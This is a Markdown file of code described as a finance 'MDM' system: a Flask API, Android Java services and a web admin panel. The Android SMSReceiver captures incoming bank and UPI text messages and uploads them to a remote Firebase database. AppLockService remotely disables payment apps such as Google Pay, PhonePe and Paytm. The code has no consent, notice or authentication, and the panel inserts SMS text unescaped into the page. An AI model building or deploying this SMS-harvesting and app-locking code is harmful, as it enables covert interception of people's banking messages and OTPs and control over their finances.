# Finance Lock & Finance Details - MDM System Update

### 1️⃣ Backend (Python Flask) - Finance Lock API

from flask import Flask, request, jsonify
import firebase_admin
from firebase_admin import credentials, db

cred = credentials.Certificate("firebase_credentials.json")
firebase_admin.initialize_app(cred, {"databaseURL": "https://your-firebase-db.firebaseio.com"})

app = Flask(__name__)

@app.route('/finance_lock', methods=['POST'])
def finance_lock():
    data = request.json
    ref = db.reference(f"/finance_lock/{data.get('device_id')}")
    ref.set({"status": "locked"})
    return jsonify({"status": "Finance apps locked"}), 200

@app.route('/finance_unlock', methods=['POST'])
def finance_unlock():
    data = request.json
    ref = db.reference(f"/finance_lock/{data.get('device_id')}")
    ref.set({"status": "unlocked"})
    return jsonify({"status": "Finance apps unlocked"}), 200

@app.route('/get_finance_details', methods=['GET'])
def get_finance_details():
    device_id = request.args.get('device_id')
    ref = db.reference(f"/finance_data/{device_id}")
    finance_data = ref.get()
    return jsonify(finance_data), 200

if __name__ == '__main__':
    app.run(debug=True)

# ------------------------------------------------------

### 2️⃣ Android APK (Java) - Finance App Lock

// AppLockService.java (Locks Finance Apps)
package com.example.mdm;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import com.google.firebase.database.*;

public class AppLockService extends Service {
    private DatabaseReference financeLockRef;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        financeLockRef = database.getReference("/finance_lock/device123");

        financeLockRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                String status = dataSnapshot.child("status").getValue(String.class);
                if ("locked".equals(status)) {
                    lockFinanceApps();
                }
            }

            @Override
            public void onCancelled(DatabaseError error) {}
        });

        return START_STICKY;
    }

    private void lockFinanceApps() {
        PackageManager pm = getPackageManager();
        String[] financeApps = {"com.google.android.apps.nbu.paisa.user", "com.phonepe.app", "net.one97.paytm"};
        for (String app : financeApps) {
            pm.setApplicationEnabledSetting(app, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

// SMSReceiver.java (Reads Finance SMS)
package com.example.mdm;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.google.firebase.database.*;

public class SMSReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            for (Object pdu : pdus) {
                SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
                String sender = message.getOriginatingAddress();
                String body = message.getMessageBody();

                if (sender.contains("BANK") || sender.contains("UPI")) {
                    DatabaseReference ref = FirebaseDatabase.getInstance().getReference("/finance_data/device123");
                    ref.push().setValue(body);
                }
            }
        }
    }
}

# ------------------------------------------------------

### 3️⃣ Web Admin Panel (HTML + JavaScript) - Finance Control

<!-- finance.html (Finance Dashboard) -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Finance Control</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
</head>
<body>
    <h1>Finance Lock & Details</h1>
    <button onclick="lockFinance()">Lock Finance Apps</button>
    <button onclick="unlockFinance()">Unlock Finance Apps</button>
    <button onclick="fetchFinanceDetails()">View Finance Details</button>
    <div id="financeLogs"></div>

    <script>
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_AUTH_DOMAIN",
            databaseURL: "YOUR_DATABASE_URL",
            projectId: "YOUR_PROJECT_ID",
            storageBucket: "YOUR_STORAGE_BUCKET",
            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
            appId: "YOUR_APP_ID"
        };
        firebase.initializeApp(firebaseConfig);

        function lockFinance() {
            const deviceId = prompt("Enter Device ID:");
            firebase.database().ref("/finance_lock/" + deviceId).set({ status: "locked" });
            alert("Finance apps locked!");
        }

        function unlockFinance() {
            const deviceId = prompt("Enter Device ID:");
            firebase.database().ref("/finance_lock/" + deviceId).set({ status: "unlocked" });
            alert("Finance apps unlocked!");
        }

        function fetchFinanceDetails() {
            const deviceId = prompt("Enter Device ID:");
            firebase.database().ref("/finance_data/" + deviceId).once('value', (snapshot) => {
                let data = snapshot.val();
                let logs = "";
                for (let key in data) {
                    logs += `<p>${data[key]}</p>`;
                }
                document.getElementById("financeLogs").innerHTML = logs;
            });
        }
    </script>
</body>
</html>
